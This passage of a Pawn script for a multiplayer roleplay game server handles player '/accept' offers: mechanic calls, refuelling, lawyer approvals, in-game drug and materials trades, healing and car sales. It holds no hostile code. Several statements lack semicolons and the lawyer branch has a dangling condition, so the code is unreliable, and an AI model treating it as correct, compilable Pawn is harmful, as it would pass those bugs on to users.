                    if(MechanicCall == playerid) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot accept your self");
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        GetPlayerName(MechanicCall, giveplayer, sizeof(giveplayer));
                        format(string, sizeof(string), "You have accepted the Mechanic Call from %s, go to that position.",giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

                        format(string, sizeof(string), "Car Mechanic %s has accepted your Mechanic Call please wait at your current Position.",sendername);
                        SendClientMessage(MechanicCall, COLOR_LIGHTBLUE, string);
            format(string, sizeof(string), "%s has accepted Mechanic Call from %s.",sendername, giveplayer);
                        SendJobMessage(7, COLOR_LIGHTBLUE, string);
                        GameTextForPlayer(playerid, "~w~Mechanic Caller~n~~r~Goto redmarker", 5000, 1);
                        MechanicCallTime[playerid] = 1;
                        MechanicAccepted[playerid] = MechanicCall;
                        IWantMechanic[MechanicCall] = 0;
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_LIGHTBLUE, "That player didn't need a mechanic yet.");
                    return 1;
                }
            }
            }
            else if(strcmp(x_job,"refill",true) == 0)
            {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept refill [playerid/PartOfName]");
                return 1;
            }
            giveplayerid = ReturnUser(tmp);
            if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_LIGHTRED,"You are not a vehicle.");
                if(RefillOffer[playerid] == giveplayerid)
                {
                    if(IsPlayerConnected(giveplayerid))
                    {
                    new vehicle = GetPlayerVehicleID(playerid);
                     if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) { SCM(playerid,COLOR_LIGHTBLUE,"You are not driver of this vehicle"); return 1; }
                     if(EngineSTATE[GetPlayerVehicleID(playerid)] == 1) { SCM(playerid,COLOR_LIGHTBLUE,"First Engine off your vehicle"); return 1; }
                     if(giveplayerid == playerid) return SCM(playerid,COLOR_LIGHTBLUE,"You cannot accept yourself");
                        if(GetPlayerPool(playerid) > RefillPrice[playerid] && Benzin[vehicle] < 110)
                        {
                            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));

                            new fueled;
                            if(PINFO[giveplayerid][pMechSkill] < 401)
                            {
                                PlayerInfo[giveplayerid][pMechSkill] ++;
                                SaveKonVal(giveplayerid, "pMechSkill", PINFO[giveplayerid][pMechSkill]);
                            }
                            if(PlayerInfo[giveplayerid][pMechSkill] == 50)
                            { SendClientMessage(giveplayerid, COLOR_YELLOW, "* Your Car Mechanic Skill is now Level 2, you can add more Fuel to any Players Cars."); }
                            else if(PlayerInfo[giveplayerid][pMechSkill] == 100)
                            { SendClientMessage(giveplayerid, COLOR_YELLOW, "* Your Car Mechanic Skill is now Level 3, you can add more Fuel to any Players Cars."); }
                            else if(PlayerInfo[giveplayerid][pMechSkill] == 200)
                            { SendClientMessage(giveplayerid, COLOR_YELLOW, "* Your Car Mechanic Skill is now Level 4, you can add more Fuel to any Players Cars."); }
                            else if(PlayerInfo[giveplayerid][pMechSkill] == 400)
                            { SendClientMessage(giveplayerid, COLOR_YELLOW, "* Your Car Mechanic Skill is now Level 5, you can add more Fuel to any Players Cars."); }
                            new level = PlayerInfo[giveplayerid][pMechSkill];
                            if(level >= 0 && level <= 50 && Benzin[vehicle] < 110)
                            { Benzin[vehicle] = Benzin[vehicle] + 20; fueled = 20; }
                            else if(level >= 51 && level <= 100 && Benzin[vehicle] < 110)
                            { Benzin[vehicle] = Benzin[vehicle] + 40; fueled = 40; }
                            else if(level >= 101 && level <= 200 && Benzin[vehicle] < 110)
                            { Benzin[vehicle] = Benzin[vehicle] + 60; fueled = 60; }
                            else if(level >= 201 && level <= 400 && Benzin[vehicle] < 110)
                            { Benzin[vehicle] = Benzin[vehicle] + 80; fueled = 80; }
                            else if(level >= 401 && Benzin[vehicle] < 110)
                            { Benzin[vehicle] = Benzin[vehicle] + 100; fueled = 100; }
                            format(string, sizeof(string), "* Your vehicle refilled with %d%, for $%d by Car Mechanic %s.",fueled,RefillPrice[playerid],giveplayer);
                            SendClientMessage(playerid, COLOR_WHITE, string);
                            format(string, sizeof(string), "* You refilled %s's car with %d%, for $%d.",sendername,fueled,RefillPrice[playerid]);
                            SendClientMessage(giveplayerid, COLOR_WHITE, string);
                            GivePlayerPool(giveplayerid, RefillPrice[playerid]);
                            GivePlayerPool(playerid, -RefillPrice[playerid]);

                            RefillOffer[playerid] = INVALID_PLAYER_ID;
                            RefillPrice[playerid] = 0;
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   You cant afford the Refill !");
                            return 1;
                        }
                    }
                    return 1;
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   No-one offered to Refill your Car !");
                    return 1;
                }
            }
            else if(strcmp(x_job,"live",true) == 0)
            {
                if(LiveOffer[playerid] < INVALID_PLAYER_ID)
                {
                    if(IsPlayerConnected(LiveOffer[playerid]))
                    {
                        if (ProxDetectorS(5.0, playerid, LiveOffer[playerid]))
                        {
                            SendClientMessage(playerid, COLOR_WHITE, "* You are frozen till the Live Conversation ends.");
                            SendClientMessage(LiveOffer[playerid], COLOR_WHITE, "* You are frozen till the Live Conversation ends (use /live again).");
                            TogglePlayerControllable(playerid, 0);
                            TogglePlayerControllable(LiveOffer[playerid], 0);
                            TalkingLive[playerid] = LiveOffer[playerid];
                            TalkingLive[LiveOffer[playerid]] = playerid;
                            LiveOffer[playerid] = INVALID_PLAYER_ID;
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "   You are to far away from the News Reporter !");
                            return 1;
                        }
                    }
                    return 1;
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "   No-one gave you a Live Conversation offer !");
                    return 1;
                }
            }
           else if(strcmp(x_job,"lawyer",true) == 0)
				{
					tmp = strtok(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendMessage(playerid, COLOR_GRAD2, "USPGE: /accept lawyer [playerid/PartOfName] [price]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if (gTeam[playerid] == TEAM_COP)
					if(PlayerInfo[playerid][pRank] >= 3)
					{
					if(PlayerInfo[playerid][pLawyerPoint] == 20)
					{
						if(IsPlayerConnected(giveplayerid))
						{
							if(giveplayerid != INVALID_PLAYER_ID)
							{
								if(PlayerInfo[giveplayerid][pJob] == 2)
								{
						tmp = strtok(cmdtext, idx);
						if(!strlen(tmp))
						{
							SendMessage(playerid, COLOR_WHITE, "HINT: /accept lawyer [playerid/PartOfName] [price]");
							return 1;
						}
						new price;
						price = strval(tmp);
						if(price < 3000 || price > 10000)
										{
											SendMessage(playerid, COLOR_GREY, "** Price not lower then 3,000$ and not higher then 10,000$! ");
											return 1;
										}
								if(SellApproval[playerid] != 9999)
							{ SCM(playerid, COLOR_WHITE, "You already sent a offer !"); return 1; }
								new Float:x, Float:y, Float:z;
							GetPlayerPos(giveplayerid,x,y,z);
							if(PlayerToPoint(5, playerid, x, y, z))
							{
									GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
									GetPlayerName(playerid, sendername, sizeof(sendername));
									format(string, sizeof(string), "Officer %s offered you to give you 1 approval for $%s (type /accept approval %d) to buy.", sendername, FormatNumber(price),playerid);
									SCM(giveplayerid, COLOR_BLUE,string);
									 format(string, sizeof(string), "* You offered %s to sell 1 approval for %s$.", giveplayer, FormatNumber(price));
									 SendMessage(playerid, COLOR_BLUE,string);

									SellApproval[playerid] = giveplayerid;
									BuyApproval[giveplayerid] = playerid;
									ApprovalPriceOffer[playerid] = price;
									return 1;
									 }
							else { SCM(playerid, COLOR_RED, "That player is not near of you."); return 1; }
								}
							else { SCM(playerid, COLOR_RED, "That player is not a lawyer."); return 1; }
							}
						}
						return 1;
					}
					else { SCM(playerid, COLOR_WHITE, "You dont have 20 lawyer points !"); return 1; }
					}
					else
					{
						SendMessage(playerid, COLOR_GREY, "Invalid action! (You are no cop / Player aint a Lawyer / Bad ID / only rank +3 can accept lawyers)");
						return 1;
					}
				}


            else if(strcmp(x_job,"drugs",true) == 0)
            {
            tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept drugs [playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                if(DrugOffer[playerid] == giveplayerid && DrugSell[giveplayerid] == playerid)
                {
                    if(GetPlayerPool(playerid) > DrugPrice[playerid])
                    {
                        if(PlayerInfo[playerid][pDrugs] < 7)
                        {
                            if(IsPlayerConnected(DrugOffer[playerid]))
                            {
                            if(PlayerInfo[DrugOffer[playerid]][pDrugs] < DrugGram[playerid])
                            {
                            SCM(playerid,COLOR_LIGHTRED,"That player hasn't enough Drug.");
                            return 1;
                            }
                                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                format(string, sizeof(string), "You bought %d gram for $%d from Drug Dealer %s.",DrugGram[playerid],DrugPrice[playerid],giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "%s has bought your %d gram for $%d ",sendername,DrugGram[playerid],DrugPrice[playerid]);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                if(PINFO[DrugOffer[playerid]][pDrugsSkill] < 401)
                                {
                                    PlayerInfo[DrugOffer[playerid]][pDrugsSkill] ++;
                                    SaveKonVal(DrugOffer[playerid], "pDrugsSkill", PINFO[DrugOffer[playerid]][pDrugsSkill]);
                                }
                                GivePlayerPool(playerid, -DrugPrice[playerid]);
                                GivePlayerPool(giveplayerid, DrugPrice[playerid]);
                                PlayerInfo[playerid][pDrugs] += DrugGram[playerid];
                                SaveKonVal(playerid, "pDrugs", PINFO[playerid][pDrugs]);
                                PlayerInfo[DrugOffer[playerid]][pDrugs] -= DrugGram[playerid];
                                SaveKonVal(DrugOffer[playerid], "pDrugs", PINFO[DrugOffer[playerid]][pDrugs]);
                                if(PlayerInfo[DrugOffer[playerid]][pDrugsSkill] == 50)
                                { SendClientMessage(DrugOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 2, you can buy more Grams and Cheaper."); }
                                else if(PlayerInfo[DrugOffer[playerid]][pDrugsSkill] == 100)
                                { SendClientMessage(DrugOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 3, you can buy more Grams and Cheaper."); }
                                else if(PlayerInfo[DrugOffer[playerid]][pDrugsSkill] == 200)
                                { SendClientMessage(DrugOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 4, you can buy more Grams and Cheaper."); }
                                else if(PlayerInfo[DrugOffer[playerid]][pDrugsSkill] == 400)
                                { SendClientMessage(DrugOffer[playerid], COLOR_YELLOW, "* Your Drug Dealer Skill is now Level 5, you can buy more Grams and Cheaper."); }
                                DrugOffer[playerid] = INVALID_PLAYER_ID;
                                DrugPrice[playerid] = 0;
                                DrugGram[playerid] = 0;
                                return 1;
                            }
                            return 1;
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_GREY, "You are fully loaded with Drugs, use them first !");
                            return 1;
                        }
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "You can't afford those Drugs !");
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "No-one offerd you any Drugs/Wrong id !");
                    return 1;
                }
            }

            else if(strcmp(x_job,"mats",true) == 0)
            {
            tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept mats [playerid/PartOfName]");
                    return 1;
                }
                giveplayerid = ReturnUser(tmp);
                if(pseller[playerid] == giveplayerid && pwantmat[playerid] == 1)
                {
                    if(GetPlayerPool(playerid) > Mhmoney[playerid])
                    {
                        if(pwantmat[playerid] > 0)
                        {
                            if(IsPlayerConnected(pseller[playerid]))
                            {
                            if(PlayerInfo[pseller[playerid]][pMats] < Mhmats[playerid])
                            {
                            SCM(playerid,COLOR_LIGHTRED,"That player hasn't enough Mats.");
                            return 1;
                            }
                                GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
                                GetPlayerName(playerid, sendername, sizeof(sendername));
                                format(string, sizeof(string), "You bought %d Materials for $%d from Arms Dealer %s.",Mhmats[playerid],Mhmoney[playerid],giveplayer);
                                SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                                format(string, sizeof(string), "%s has bought your %d Materials for $%d ",psellername,Mhmats[playerid],Mhmoney[playerid]);
                                SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
                                GivePlayerPool(playerid, -Mhmoney[playerid]);
                                GivePlayerPool(giveplayerid, Mhmoney[playerid]);
                                PlayerInfo[playerid][pMats] += Mhmats[playerid];
                                SaveKonVal(playerid, "pMats", PINFO[playerid][pMats]);
                                PlayerInfo[pseller[playerid]][pMats] -= Mhmats[playerid];
                                SaveKonVal(pseller[playerid], "pMats", PINFO[pseller[playerid]][pMats]);
                                pwantmat[playerid] = 0;
                                pseller[playerid] = 999;
                                Mhmoney[playerid] = 0;
                                Mhmats[playerid] = 0;
                                return 1;
                        }
                        }
                        else
                        {
                            SendClientMessage(playerid, COLOR_RED, " No One Has Affered You To Sell Materials")
                            return 1;
						}
                    }
                    else
                    {
                        SendClientMessage(playerid, COLOR_GREY, "You can't afford those Materials !");
                        return 1;
                    }
                }
                else
                {
                    SendClientMessage(playerid, COLOR_GREY, "No-one offerd you any Materials id !");
                    return 1;
                }
            }

				else if(strcmp(x_job,"materials",true) == 0)
				{
				tmp = strtok(cmdtext, idx);
					if(!strlen(tmp))
					{
						SendMessage(playerid, COLOR_GRAD2, "USPGE: /accept materials [playerid/PartOfName]");
						return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(MatxOffer[playerid] == giveplayerid && MatxSell[giveplayerid] == playerid)
					{
						if(GetPlayerPool(playerid) > MatxPrice[playerid])
						{
								if(IsPlayerConnected(MatxOffer[playerid]))
								{
								if(PlayerInfo[MatxOffer[playerid]][pMats] < MatxGram[playerid])
								{
								SCM(playerid,COLOR_LIGHTRED,"That player hasn't enough materials.");
								return 1;
								}
									GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
									GetPlayerName(playerid, sendername, sizeof(sendername));
									format(string, sizeof(string), "You bought %d materials for $%d from Arms Dealer %s.",MatxGram[playerid],MatxPrice[playerid],giveplayer);
									SendMessage(playerid, COLOR_LIGHTBLUE, string);
									format(string, sizeof(string), "%s has bought your %d materials for $%d ",sendername,MatxGram[playerid],MatxPrice[playerid]);
									SendMessage(giveplayerid, COLOR_LIGHTBLUE, string);

									GivePlayerPool(playerid, -MatxPrice[playerid]);
									GivePlayerPool(giveplayerid, MatxPrice[playerid]);
									PlayerInfo[playerid][pMats] += MatxGram[playerid];
									SaveKonVal(playerid, "pMats", PINFO[playerid][pMats]);
									PlayerInfo[MatxOffer[playerid]][pMats] -= MatxGram[playerid];
									SaveKonVal(MatxOffer[playerid], "pMats", PINFO[MatxOffer[playerid]][pMats]);

									MatxOffer[playerid] = INVALID_PLAYER_ID;
									MatxPrice[playerid] = 0;
									MatxGram[playerid] = 0;
									return 1;
								}
								return 1;

						}
						else
						{
							SendMessage(playerid, COLOR_GREY, "You can't afford those Materials !");
							return 1;
						}
					}
					else
					{
						SendMessage(playerid, COLOR_GREY, "No-one offerd you any Materials/Wrong id !");
						return 1;
					}
				}

            else if(strcmp(x_job,"heal",true) == 0)
            {
			    tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /accept heal [playerid/PartOfName]");
                    return 1;
                }
				idss[playerid] = ReturnUser(tmp);
				if(shealdare[playerid] != 0)
				{
				 SetPlayerKhoon(true,playerid,100.00);
				 GivePlayerPool(playerid,-sprice[playerid]);
				 GivePlayerPool(idss[playerid],sprice[playerid]);
				 shealdare[playerid] = 0;
				 SetPlayerHealth(playerid ,100.00)
				 GetPlayerName(playerid, sendername, sizeof(sendername));
				 new string2[500];
			     format(string2, sizeof(string2), "%s accepted your request for heal ", sendername);
                 SendClientMessage(idss[playerid], COLOR_LIGHTBLUE, string2);
				}
				else
				{
				   SendClientMessage(playerid, COLOR_GRAD2, "You Haven't Request");
				}
				return 1;
            }
            else if(strcmp(x_job,"personalcar",true) == 0)
            {
                tmp = strtok(cmdtext,idx);
                if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /accept personalcar <PlayerID/PartOfName>");
                new taraf = ReturnUser(tmp);
                if(!IsPlayerConnected(taraf)) return SCM(playerid,COLOR_ALI,"That player is offline.");
                if(OnSellCar[taraf] != playerid) {if(OwnableCarOffer[playerid] == taraf) { OwnableCarOffer[playerid] = INVALID_PLAYER_ID; OwnableCarMethod[playerid] = 0;OwnableCarID[playerid] = 0; OwnableCarPrice[playerid] = 0; } return SCM(playerid,COLOR_ALI,"That player doesn't offer you a car.");}
                if(!ProxDetectorS(5.0, playerid, taraf)) return SCM(playerid,COLOR_ALI,"You must near this player.");
                if(GetPlayerVehicleID(taraf) != OwnableCarID[playerid]) {format(string,sizeof string,"%s wants to accept this offer but you need to sit in your vehicle to this offer accept seccussfully",PINFO[playerid][pName]);SCM(taraf,COLOR_ALI,string);format(string,sizeof string,"%s must sit on him/her vehicle.",PINFO[taraf][pName]);return SCM(playerid,COLOR_ALI,string);}
                format(string, sizeof(string), "You bought a car for $%s from %s.",FormatNumber(OwnableCarPrice[playerid]),PINFO[OwnableCarOffer[playerid]][pName]);
                SendClientMessage(playerid, COL_SYN, string);
                format(string, sizeof(string), "%s has bought your car for $%s.",PINFO[playerid][pName],FormatNumber(OwnableCarPrice[playerid]));
                SendClientMessage(OwnableCarOffer[playerid], COL_SYN, string);
                RemovePlayerFromVehicle(OwnableCarOffer[playerid]);
                GivePlayerPool(playerid, - OwnableCarPrice[playerid]);
                GivePlayerPool(OwnableCarOffer[playerid], OwnableCarPrice[playerid]);
                if(OwnableCarMethod[playerid] == 1 && ((PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] != 0) || (PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0)))
                {
                    PlayerInfo[playerid][cLocationx] = PlayerInfo[OwnableCarOffer[playerid]][cLocationx];
                    PlayerInfo[playerid][cLocationy] = PlayerInfo[OwnableCarOffer[playerid]][cLocationy];
                    PlayerInfo[playerid][cLocationz] = PlayerInfo[OwnableCarOffer[playerid]][cLocationz];
                    PlayerInfo[playerid][cAngle] = PlayerInfo[OwnableCarOffer[playerid]][cAngle];
                    PlayerInfo[playerid][cColor1] = PlayerInfo[OwnableCarOffer[playerid]][cColor1];
                    PlayerInfo[playerid][cColor2] = PlayerInfo[OwnableCarOffer[playerid]][cColor2];
                    PlayerInfo[playerid][cModel] = PlayerInfo[OwnableCarOffer[playerid]][cModel];
                    PlayerInfo[playerid][cPrice] = PlayerInfo[OwnableCarOffer[playerid]][cPrice];
                    new plate = PlayerInfo[OwnableCarOffer[playerid]][cPlate];
                    new strings[128];
                    format(strings,128,"%s",plate);
                    strmid(PlayerInfo[playerid][cPlate], strings, 0, strlen(strings), 255);
                    PlayerInfo[playerid][cLock] = PlayerInfo[OwnableCarOffer[playerid]][cLock];
                    PlayerInfo[playerid][cDestroyed] = PlayerInfo[OwnableCarOffer[playerid]][cDestroyed];
                    PlayerInfo[playerid][cFixed] = PlayerInfo[OwnableCarOffer[playerid]][cFixed];
                    PINFO[playerid][cInsurance] = PlayerInfo[OwnableCarOffer[playerid]][cInsurance];
                    SaveKonVal(playerid, "cInsurance", PINFO[OwnableCarOffer[playerid]][cInsurance]);
                    PlayerInfo[playerid][cFuel] = PlayerInfo[OwnableCarOffer[playerid]][cFuel];
                    PlayerInfo[playerid][cHealth] = PlayerInfo[OwnableCarOffer[playerid]][cHealth];
                    PINFO[playerid][gLocationX] = PINFO[OwnableCarOffer[playerid]][gLocationX];
                    SaveKonFloat(playerid, "gLocationX", PINFO[OwnableCarOffer[playerid]][gLocationX]);
                    PINFO[playerid][gLocationY] = PINFO[OwnableCarOffer[playerid]][gLocationY];
                    SaveKonFloat(playerid, "gLocationY", PINFO[OwnableCarOffer[playerid]][gLocationY]);
                    PINFO[playerid][gLocationZ] = PINFO[OwnableCarOffer[playerid]][gLocationZ];
                    SaveKonFloat(playerid, "gLocationZ", PINFO[OwnableCarOffer[playerid]][gLocationZ]);
                    PINFO[playerid][gAngle] = PINFO[OwnableCarOffer[playerid]][gAngle];
                    SaveKonFloat(playerid, "gAngle", PINFO[OwnableCarOffer[playerid]][gAngle]);
                    PINFO[playerid][gParked] = PINFO[OwnableCarOffer[playerid]][gParked];
                    SaveKonVal(playerid, "gParked", PINFO[OwnableCarOffer[playerid]][gParked]);
                    PlayerInfo[playerid][cMod1] = PlayerInfo[OwnableCarOffer[playerid]][cMod1];
                    PlayerInfo[playerid][cMod3] = PlayerInfo[OwnableCarOffer[playerid]][cMod3];
                    PlayerInfo[playerid][cMod4] = PlayerInfo[OwnableCarOffer[playerid]][cMod4];
                    PlayerInfo[playerid][cMod5] = PlayerInfo[OwnableCarOffer[playerid]][cMod5];
                    PlayerInfo[playerid][cMod6] = PlayerInfo[OwnableCarOffer[playerid]][cMod6];
                    PlayerInfo[playerid][cMod7] = PlayerInfo[OwnableCarOffer[playerid]][cMod7];
                    PlayerInfo[playerid][cMod8] = PlayerInfo[OwnableCarOffer[playerid]][cMod8];
                    PlayerInfo[playerid][cMod9] = PlayerInfo[OwnableCarOffer[playerid]][cMod9];
                    PlayerInfo[playerid][cMod10] = PlayerInfo[OwnableCarOffer[playerid]][cMod10];
                    PlayerInfo[playerid][cMod11] = PlayerInfo[OwnableCarOffer[playerid]][cMod11];
                    PlayerInfo[playerid][cMod12] = PlayerInfo[OwnableCarOffer[playerid]][cMod12];
                    PlayerInfo[playerid][cMod13] = PlayerInfo[OwnableCarOffer[playerid]][cMod13];
                    PlayerInfo[playerid][cMod14] = PlayerInfo[OwnableCarOffer[playerid]][cMod14];
                    PlayerInfo[playerid][cMod15] = PlayerInfo[OwnableCarOffer[playerid]][cMod15];
                    PlayerInfo[playerid][cMod16] = PlayerInfo[OwnableCarOffer[playerid]][cMod16];
                    PlayerInfo[playerid][cMod17] = PlayerInfo[OwnableCarOffer[playerid]][cMod17];
                    PlayerInfo[playerid][cPaintJob] = PlayerInfo[OwnableCarOffer[playerid]][cPaintJob];
                    PlayerInfo[playerid][cKilo] = PlayerInfo[OwnableCarOffer[playerid]][cKilo];
                    PlayerInfo[playerid][cPanel] = PlayerInfo[OwnableCarOffer[playerid]][cPanel];
                    PlayerInfo[playerid][cDoors] = PlayerInfo[OwnableCarOffer[playerid]][cDoors];
                    PlayerInfo[playerid][cLights] = PlayerInfo[OwnableCarOffer[playerid]][cLights];
                    PlayerInfo[playerid][cTires] = PlayerInfo[OwnableCarOffer[playerid]][cTires];
                    PINFO[playerid][pCar] = OwnableCarID[playerid];
                    SaveKonVal(playerid, "pCar", OwnableCarID[playerid]);
                    OwnedMashin[OwnableCarID[playerid]] = 1;
                    MashinOwner[OwnableCarID[playerid]] = playerid;
                    PlayerPlayMusic(playerid);
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationx] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationy] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLocationz] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cAngle] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cColor1] = 9999;
                    PlayerInfo[OwnableCarOffer[playerid]][cColor2] = 9999;
                    PlayerInfo[OwnableCarOffer[playerid]][cModel] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cPrice] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cLock] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cDestroyed] = 0;
                    PINFO[OwnableCarOffer[playerid]][cFixed] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "cFixed", 0);
                    PINFO[OwnableCarOffer[playerid]][cInsurance] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "cInsurance", 0);
                    PlayerInfo[OwnableCarOffer[playerid]][cFuel] = 0;
                    PINFO[OwnableCarOffer[playerid]][gLocationX] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationX", 0);
                    PINFO[OwnableCarOffer[playerid]][gLocationY] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationY", 0);
                    PINFO[OwnableCarOffer[playerid]][gLocationZ] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gLocationZ", 0);
                    PINFO[OwnableCarOffer[playerid]][gAngle] = 0;
                    SaveKonFloat(OwnableCarOffer[playerid], "gAngle", 0);
                    PINFO[OwnableCarOffer[playerid]][gParked] = 0;
                    SaveKonVal(OwnableCarOffer[playerid], "gParked", 0);
                    PlayerInfo[OwnableCarOffer[playerid]][cHealth] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod1] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod3] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod4] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod5] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod6] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod7] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod8] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod9] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod10] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod11] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod12] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod13] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod14] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod15] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod16] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cMod17] = 0;
                    PlayerInfo[OwnableCarOffer[playerid]][cPaintJob] = 3;
                    PlayerInfo[OwnableCarOffer[playerid]][cKilo] = 0.0;
                    PlayerInfo[OwnableCarOffer[playerid]][pCar] = 0;
                }
                else if(OwnableCarMethod[playerid] == 2 && ((PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] != 0) || (PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0)))
                {
                    PlayerInfo[playerid][cLocationx] = PlayerInfo[OwnableCarOffer[playerid]][cLocationx_2];
                    PlayerInfo[playerid][cLocationy] = PlayerInfo[OwnableCarOffer[playerid]][cLocationy_2];
                    PlayerInfo[playerid][cLocationz] = PlayerInfo[OwnableCarOffer[playerid]][cLocationz_2];
                    PlayerInfo[playerid][cAngle] = PlayerInfo[OwnableCarOffer[playerid]][cAngle_2];
                    PlayerInfo[playerid][cColor1] = PlayerInfo[OwnableCarOffer[playerid]][cColor1_2];
                    PlayerInfo[playerid][cColor2] = PlayerInfo[OwnableCarOffer[playerid]][cColor2_2];
                    PlayerInfo[playerid][cModel] = PlayerInfo[OwnableCarOffer[playerid]][cModel_2];
                    PlayerInfo[playerid][cPrice] = PlayerInfo[OwnableCarOffer[playerid]][cPrice_2];
                    new plate = PlayerInfo[OwnableCarOffer[playerid]][cPlate_2];
                    new strings[128];
                    format(strings,128,"%s",plate);
                    strmid(PlayerInfo[playerid][cPlate], strings, 0, strlen(strings), 255);
                    PlayerInfo[playerid][cLock] = PlayerInfo[OwnableCarOffer[playerid]][cLock_2];
                    PlayerInfo[playerid][cDestroyed] = PlayerInfo[OwnableCarOffer[playerid]][cDestroyed_2];
                    PlayerInfo[playerid][cFixed] = PlayerInfo[OwnableCarOffer[playerid]][cFixed_2];
                    PINFO[playerid][cInsurance] = PlayerInfo[OwnableCarOffer[playerid]][cInsurance_2];
                    SaveKonVal(playerid, "cInsurance", PINFO[OwnableCarOffer[playerid]][cInsurance_2]);
                    PlayerInfo[playerid][cFuel] = PlayerInfo[OwnableCarOffer[playerid]][cFuel_2];
                    PlayerInfo[playerid][cHealth] = PlayerInfo[OwnableCarOffer[playerid]][cHealth_2];
                    PlayerInfo[playerid][cMod1] = PlayerInfo[OwnableCarOffer[playerid]][cMod1_2];
                    PlayerInfo[playerid][cMod3] = PlayerInfo[OwnableCarOffer[playerid]][cMod3_2];
                    PlayerInfo[playerid][cMod4] = PlayerInfo[OwnableCarOffer[playerid]][cMod4_2];
                    PlayerInfo[playerid][cMod5] = PlayerInfo[OwnableCarOffer[playerid]][cMod5_2];
                    PlayerInfo[playerid][cMod6] = PlayerInfo[OwnableCarOffer[playerid]][cMod6_2];
                    PlayerInfo[playerid][cMod7] = PlayerInfo[OwnableCarOffer[playerid]][cMod7_2];
                    PINFO[playerid][gLocationX] = PINFO[OwnableCarOffer[playerid]][gLocationX_2];
                    SaveKonFloat(playerid, "gLocationX", PINFO[OwnableCarOffer[playerid]][gLocationX_2]);
                    PINFO[playerid][gLocationY] = PINFO[OwnableCarOffer[playerid]][gLocationY_2];
                    SaveKonFloat(playerid, "gLocationY", PINFO[OwnableCarOffer[playerid]][gLocationY_2]);
                    PINFO[playerid][gLocationZ] = PINFO[OwnableCarOffer[playerid]][gLocationZ_2];
                    SaveKonFloat(playerid, "gLocationZ", PINFO[OwnableCarOffer[playerid]][gLocationZ_2]);
                    PINFO[playerid][gAngle] = PINFO[OwnableCarOffer[playerid]][gAngle_2];
